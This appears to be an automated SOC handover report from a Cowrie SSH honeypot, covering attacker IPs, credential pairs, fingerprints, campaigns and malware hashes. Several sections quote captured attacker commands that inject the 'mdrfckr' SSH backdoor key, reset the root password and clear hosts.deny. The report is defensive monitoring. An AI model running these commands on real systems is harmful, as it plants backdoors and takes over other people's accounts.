# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-06 |
| **Generated At** | 2026-04-06T09:06:52Z |
| **Shift Time** | 09:06 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **52** |
| Confirmed Threats | **50** |
| False Positives Filtered | **2** (3.9%) |
| Unique Attacker IPs | **12** |
| Countries of Origin | **6** |
| High Severity Cases | **6** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **46** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **16** |
| Unique Credential Pairs | **13** |
| Unique Usernames | **8** |
| Unique Passwords | **13** |
| Successful Auth Pairs | **6** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 6 |
| `345gs5662d34` | 3 |
| `steam` | 2 |
| `temp1` | 1 |
| `Debian` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 2 |
| `temp1` | 1 |
| `qqDD123` | 1 |
| `logon` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 2 |
| `temp1` | `temp1` | 1 |
| `root` | `qqDD123` | 1 |
| `Debian` | `logon` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qqDD123` | `14.103.118.248` | 2026-04-06T07:53:24 |
| `root` | `3245gs5662d34` | `14.103.118.248` | 2026-04-06T07:53:27 |
| `root` | `2222` | `203.83.231.93` | 2026-04-06T08:06:55 |
| `root` | `Aa2023` | `43.164.195.69` | 2026-04-06T08:08:57 |
| `root` | `3245gs5662d34` | `43.164.195.69` | 2026-04-06T08:09:06 |
| `root` | `8ik,!!` | `203.83.231.93` | 2026-04-06T08:09:21 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **52** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 39 |
| OpenSSH | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 39 | 4 |
| `acaa53e0a7d7...` | Mirai/variant | 4 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 39 | 4 | Modern SSH client |
| `acaa53e0a7d7...` | OpenSSH | 4 | 4 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:IBsVICNGkJXO"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `203.83.231.93`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `14.103.118.248`, `43.164.195.69`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **12** |
| Unique ASNs | **11** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 1 | HIGH |
| `AS10439` | CariNet, Inc. | 1 | HIGH |
| `AS134768` | CHINANET SHAANXI province Cloud Base network | 1 | HIGH |
| `AS24444` | Shandong Mobile Communication Company Limited | 1 | HIGH |
| `AS262422` | Anderson Gustavo Neves Gomes - ME | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | MEDIUM |
| `AS214664` | JSC Buduschee | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (6)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-cd2a9f6d6799

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]248` |
| **First Seen** | 2026-04-06 07:53 |
| **Last Seen** | 2026-04-06 07:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 07:53:22` | `cowrie.session.connect` |
| `2026-04-06 07:53:22` | `cowrie.client.version` |
| `2026-04-06 07:53:23` | `cowrie.client.kex` |
| `2026-04-06 07:53:24` | `cowrie.login.success` |
| `2026-04-06 07:53:24` | `cowrie.session.params` |
| `2026-04-06 07:53:24` | `cowrie.command.input` |
| `2026-04-06 07:53:24` | `cowrie.command.failed` |
| `2026-04-06 07:53:24` | `cowrie.log.closed` |
| `2026-04-06 07:53:24` | `cowrie.session.params` |
| `2026-04-06 07:53:24` | `cowrie.command.input` |
| `2026-04-06 07:53:24` | `cowrie.session.file_download` |
| `2026-04-06 07:53:24` | `cowrie.log.closed` |
| `2026-04-06 07:53:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]248` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6796d3813604

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]248` |
| **First Seen** | 2026-04-06 07:53 |
| **Last Seen** | 2026-04-06 07:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 07:53:27` | `cowrie.session.connect` |
| `2026-04-06 07:53:27` | `cowrie.client.version` |
| `2026-04-06 07:53:27` | `cowrie.client.kex` |
| `2026-04-06 07:53:27` | `cowrie.login.success` |
| `2026-04-06 07:53:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]248` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dd7b3cf8d81

| Field | Detail |
|---|---|
| **Source IP** | `203.83.231[.]93` |
| **First Seen** | 2026-04-06 08:06 |
| **Last Seen** | 2026-04-06 08:07 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:IBsVICNGkJXO"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 08:06:54` | `cowrie.session.connect` |
| `2026-04-06 08:06:54` | `cowrie.client.version` |
| `2026-04-06 08:06:54` | `cowrie.client.kex` |
| `2026-04-06 08:06:55` | `cowrie.login.success` |
| `2026-04-06 08:06:55` | `cowrie.session.params` |
| `2026-04-06 08:06:55` | `cowrie.command.input` |
| `2026-04-06 08:06:55` | `cowrie.command.failed` |
| `2026-04-06 08:06:56` | `cowrie.log.closed` |
| `2026-04-06 08:06:56` | `cowrie.session.params` |
| `2026-04-06 08:06:56` | `cowrie.command.input` |
| `2026-04-06 08:06:56` | `cowrie.session.file_download` |
| `2026-04-06 08:06:56` | `cowrie.log.closed` |
| `2026-04-06 08:07:05` | `cowrie.session.params` |
| `2026-04-06 08:07:05` | `cowrie.command.input` |
| `2026-04-06 08:07:05` | `cowrie.log.closed` |
| `2026-04-06 08:07:06` | `cowrie.session.params` |
| `2026-04-06 08:07:06` | `cowrie.command.input` |
| `2026-04-06 08:07:06` | `cowrie.log.closed` |
| `2026-04-06 08:07:06` | `cowrie.session.params` |
| `2026-04-06 08:07:06` | `cowrie.command.input` |
| `2026-04-06 08:07:07` | `cowrie.session.file_download` |
| `2026-04-06 08:07:07` | `cowrie.log.closed` |
| `2026-04-06 08:07:07` | `cowrie.session.params` |
| `2026-04-06 08:07:07` | `cowrie.command.input` |
| `2026-04-06 08:07:07` | `cowrie.log.closed` |
| `2026-04-06 08:07:08` | `cowrie.session.params` |
| `2026-04-06 08:07:08` | `cowrie.command.input` |
| `2026-04-06 08:07:08` | `cowrie.log.closed` |
| `2026-04-06 08:07:08` | `cowrie.session.params` |
| `2026-04-06 08:07:08` | `cowrie.command.input` |
| `2026-04-06 08:07:08` | `cowrie.command.input` |
| `2026-04-06 08:07:08` | `cowrie.log.closed` |
| `2026-04-06 08:07:09` | `cowrie.session.params` |
| `2026-04-06 08:07:09` | `cowrie.command.input` |
| `2026-04-06 08:07:09` | `cowrie.log.closed` |
| `2026-04-06 08:07:09` | `cowrie.session.params` |
| `2026-04-06 08:07:09` | `cowrie.command.input` |
| `2026-04-06 08:07:09` | `cowrie.log.closed` |
| `2026-04-06 08:07:10` | `cowrie.session.params` |
| `2026-04-06 08:07:10` | `cowrie.command.input` |
| `2026-04-06 08:07:10` | `cowrie.log.closed` |
| `2026-04-06 08:07:10` | `cowrie.session.params` |
| `2026-04-06 08:07:10` | `cowrie.command.input` |
| `2026-04-06 08:07:11` | `cowrie.log.closed` |
| `2026-04-06 08:07:11` | `cowrie.session.params` |
| `2026-04-06 08:07:11` | `cowrie.command.input` |
| `2026-04-06 08:07:11` | `cowrie.log.closed` |
| `2026-04-06 08:07:11` | `cowrie.session.params` |
| `2026-04-06 08:07:11` | `cowrie.command.input` |
| `2026-04-06 08:07:12` | `cowrie.log.closed` |
| `2026-04-06 08:07:12` | `cowrie.session.params` |
| `2026-04-06 08:07:12` | `cowrie.command.input` |
| `2026-04-06 08:07:12` | `cowrie.log.closed` |
| `2026-04-06 08:07:13` | `cowrie.session.params` |
| `2026-04-06 08:07:13` | `cowrie.command.input` |
| `2026-04-06 08:07:13` | `cowrie.log.closed` |
| `2026-04-06 08:07:13` | `cowrie.session.params` |
| `2026-04-06 08:07:13` | `cowrie.command.input` |
| `2026-04-06 08:07:13` | `cowrie.log.closed` |
| `2026-04-06 08:07:14` | `cowrie.session.params` |
| `2026-04-06 08:07:14` | `cowrie.command.input` |
| `2026-04-06 08:07:14` | `cowrie.log.closed` |
| `2026-04-06 08:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.83.231[.]93` to AbuseIPDB if not already reported
- [ ] Block `203.83.231[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5af3743c6bbf

| Field | Detail |
|---|---|
| **Source IP** | `43.164.195[.]69` |
| **First Seen** | 2026-04-06 08:08 |
| **Last Seen** | 2026-04-06 08:09 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 08:08:55` | `cowrie.session.connect` |
| `2026-04-06 08:08:55` | `cowrie.client.version` |
| `2026-04-06 08:08:56` | `cowrie.client.kex` |
| `2026-04-06 08:08:57` | `cowrie.login.success` |
| `2026-04-06 08:08:58` | `cowrie.session.params` |
| `2026-04-06 08:08:58` | `cowrie.command.input` |
| `2026-04-06 08:08:58` | `cowrie.command.failed` |
| `2026-04-06 08:08:58` | `cowrie.log.closed` |
| `2026-04-06 08:08:59` | `cowrie.session.params` |
| `2026-04-06 08:08:59` | `cowrie.command.input` |
| `2026-04-06 08:09:00` | `cowrie.session.file_download` |
| `2026-04-06 08:09:00` | `cowrie.log.closed` |
| `2026-04-06 08:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.195[.]69` to AbuseIPDB if not already reported
- [ ] Block `43.164.195[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f96670457858

| Field | Detail |
|---|---|
| **Source IP** | `43.164.195[.]69` |
| **First Seen** | 2026-04-06 08:09 |
| **Last Seen** | 2026-04-06 08:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 08:09:04` | `cowrie.session.connect` |
| `2026-04-06 08:09:04` | `cowrie.client.version` |
| `2026-04-06 08:09:04` | `cowrie.client.kex` |
| `2026-04-06 08:09:06` | `cowrie.login.success` |
| `2026-04-06 08:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.195[.]69` to AbuseIPDB if not already reported
- [ ] Block `43.164.195[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-378b79642a7e

| Field | Detail |
|---|---|
| **Source IP** | `203.83.231[.]93` |
| **First Seen** | 2026-04-06 08:09 |
| **Last Seen** | 2026-04-06 08:09 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:jkR7zHcbTxi9"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 08:09:20` | `cowrie.session.connect` |
| `2026-04-06 08:09:20` | `cowrie.client.version` |
| `2026-04-06 08:09:20` | `cowrie.client.kex` |
| `2026-04-06 08:09:21` | `cowrie.login.success` |
| `2026-04-06 08:09:21` | `cowrie.session.params` |
| `2026-04-06 08:09:21` | `cowrie.command.input` |
| `2026-04-06 08:09:21` | `cowrie.command.failed` |
| `2026-04-06 08:09:21` | `cowrie.log.closed` |
| `2026-04-06 08:09:21` | `cowrie.session.params` |
| `2026-04-06 08:09:21` | `cowrie.command.input` |
| `2026-04-06 08:09:22` | `cowrie.session.file_download` |
| `2026-04-06 08:09:22` | `cowrie.log.closed` |
| `2026-04-06 08:09:35` | `cowrie.session.params` |
| `2026-04-06 08:09:35` | `cowrie.command.input` |
| `2026-04-06 08:09:35` | `cowrie.log.closed` |
| `2026-04-06 08:09:36` | `cowrie.session.params` |
| `2026-04-06 08:09:36` | `cowrie.command.input` |
| `2026-04-06 08:09:36` | `cowrie.log.closed` |
| `2026-04-06 08:09:36` | `cowrie.session.params` |
| `2026-04-06 08:09:36` | `cowrie.command.input` |
| `2026-04-06 08:09:36` | `cowrie.session.file_download` |
| `2026-04-06 08:09:36` | `cowrie.log.closed` |
| `2026-04-06 08:09:37` | `cowrie.session.params` |
| `2026-04-06 08:09:37` | `cowrie.command.input` |
| `2026-04-06 08:09:37` | `cowrie.log.closed` |
| `2026-04-06 08:09:37` | `cowrie.session.params` |
| `2026-04-06 08:09:37` | `cowrie.command.input` |
| `2026-04-06 08:09:37` | `cowrie.log.closed` |
| `2026-04-06 08:09:37` | `cowrie.session.params` |
| `2026-04-06 08:09:37` | `cowrie.command.input` |
| `2026-04-06 08:09:37` | `cowrie.command.input` |
| `2026-04-06 08:09:38` | `cowrie.log.closed` |
| `2026-04-06 08:09:38` | `cowrie.session.params` |
| `2026-04-06 08:09:38` | `cowrie.command.input` |
| `2026-04-06 08:09:38` | `cowrie.log.closed` |
| `2026-04-06 08:09:38` | `cowrie.session.params` |
| `2026-04-06 08:09:38` | `cowrie.command.input` |
| `2026-04-06 08:09:39` | `cowrie.log.closed` |
| `2026-04-06 08:09:39` | `cowrie.session.params` |
| `2026-04-06 08:09:39` | `cowrie.command.input` |
| `2026-04-06 08:09:39` | `cowrie.log.closed` |
| `2026-04-06 08:09:39` | `cowrie.session.params` |
| `2026-04-06 08:09:39` | `cowrie.command.input` |
| `2026-04-06 08:09:40` | `cowrie.log.closed` |
| `2026-04-06 08:09:40` | `cowrie.session.params` |
| `2026-04-06 08:09:40` | `cowrie.command.input` |
| `2026-04-06 08:09:40` | `cowrie.log.closed` |
| `2026-04-06 08:09:40` | `cowrie.session.params` |
| `2026-04-06 08:09:40` | `cowrie.command.input` |
| `2026-04-06 08:09:41` | `cowrie.log.closed` |
| `2026-04-06 08:09:41` | `cowrie.session.params` |
| `2026-04-06 08:09:41` | `cowrie.command.input` |
| `2026-04-06 08:09:41` | `cowrie.log.closed` |
| `2026-04-06 08:09:41` | `cowrie.session.params` |
| `2026-04-06 08:09:41` | `cowrie.command.input` |
| `2026-04-06 08:09:41` | `cowrie.log.closed` |
| `2026-04-06 08:09:42` | `cowrie.session.params` |
| `2026-04-06 08:09:42` | `cowrie.command.input` |
| `2026-04-06 08:09:42` | `cowrie.log.closed` |
| `2026-04-06 08:09:42` | `cowrie.session.params` |
| `2026-04-06 08:09:42` | `cowrie.command.input` |
| `2026-04-06 08:09:43` | `cowrie.log.closed` |
| `2026-04-06 08:09:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.83.231[.]93` to AbuseIPDB if not already reported
- [ ] Block `203.83.231[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `203.83.231[.]93` | **24** | 2026-04-06 07:51 | 2026-04-06 08:20 | 38m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.118[.]248` | **12** | 2026-04-06 07:51 | 2026-04-06 07:56 | 18m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `112.53.70[.]99` | 1 | 2026-04-06 07:54 | 2026-04-06 07:55 | 76s | 0 | `T1592` | 🟢 LOW |
| `117.245.142[.]93` | 1 | 2026-04-06 08:16 | 2026-04-06 08:16 | 13s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]226` | 1 | 2026-04-06 08:09 | 2026-04-06 08:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `177.39.80[.]77` | 1 | 2026-04-06 08:30 | 2026-04-06 08:30 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.235.193[.]170` | 1 | 2026-04-06 07:54 | 2026-04-06 07:54 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.164.195[.]69` | 1 | 2026-04-06 08:09 | 2026-04-06 08:09 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.91.64[.]7` | 1 | 2026-04-06 08:03 | 2026-04-06 08:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.240.236[.]116` | 1 | 2026-04-06 08:13 | 2026-04-06 08:13 | 10s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 42/100 | 🟡 MEDIUM | **32/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
